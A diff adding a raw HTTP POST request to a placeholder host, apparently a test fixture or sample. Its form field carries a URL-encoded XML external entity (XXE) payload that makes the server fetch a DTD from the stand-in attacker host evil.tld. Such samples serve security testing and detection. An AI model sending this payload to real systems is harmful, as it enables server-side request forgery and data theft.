@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+Connection: close
+
+s=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C%21DOCTYPE+r+%5B%3C%21ENTITY+x+SYSTEM+%22http%3A%2F%2Fevil.tld%2Fx.dtd%22%3E%5D%3E%3Cr%3E%26x%3B%3C%2Fr%3E
